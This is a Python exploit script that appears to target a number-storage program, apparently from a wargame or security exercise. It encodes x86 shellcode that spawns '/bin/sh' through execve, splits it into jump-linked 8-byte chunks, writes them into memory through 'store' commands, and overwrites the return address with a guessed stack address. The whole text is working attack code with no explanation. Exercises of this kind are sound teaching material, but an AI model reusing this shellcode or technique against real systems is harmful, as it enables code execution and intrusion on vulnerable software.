instructions = ["90 " * 4] * 50
instructions.extend(["81 c4 00 fe ff ff", "6a 68", "68 2f 2f 2f 73", "68 2f 62 69 6e", "89 e3", "68 73 68 00 00", "31 c9", "51", "6a 04", "59", "01 e1", "51", "89 e1", "31 d2", "31 c0", "b0 0b", "cd 80"])

# From guessing-and-checking.
addr = "bf ff f7 00"

inst_num = 0
buffer_index = 1
payload = bytearray()

while inst_num < len(instructions):

	# Build 8 bytes (since we can store two indices adjacent to each other)
	current_index_bytes = bytearray()
	while inst_num < len(instructions):

		# Get instruction bytes and check if we still have space in this set of 8
		inst = bytearray.fromhex(instructions[inst_num])
		if len(inst) + len(current_index_bytes) > 6: # 2 bytes for jump instruction
			break
		else:
			# Still have space! Add the instruction to this index.
			current_index_bytes.extend(inst)
			inst_num += 1

	# Add on the "jmp 0x4" to the end
	current_index_bytes.extend(bytearray.fromhex("eb 04"))

	# Make sure the current_index_bytes is 8 bytes long by padding the front with NOPs
	num_nops = 8 - len(current_index_bytes)
	final_bytes = bytearray.fromhex("90 " * num_nops)
	final_bytes.extend(current_index_bytes)

	# Add final_bytes to payload
	payload.extend(b"store\n")
	payload.extend(bytearray(str(int.from_bytes(final_bytes[0:4], byteorder='little')) + "\n", "utf-8"))
	payload.extend(bytearray(str(buffer_index) + "\n", "utf-8"))
	payload.extend(b"store\n")
	payload.extend(bytearray(str(int.from_bytes(final_bytes[4:], byteorder='little')) + "\n", "utf-8"))
	payload.extend(bytearray(str(buffer_index + 1) + "\n", "utf-8"))

	buffer_index += 3

# Overwrite the return address and quit
payload.extend(b"store\n")
payload.extend(bytearray(str(int.from_bytes(bytearray.fromhex(addr), byteorder='big')) + "\n", "utf-8"))
payload.extend(b"109\n")
payload.extend(b"quit\n")

# Strip the newline from the print statement
print(payload.decode(), end="")
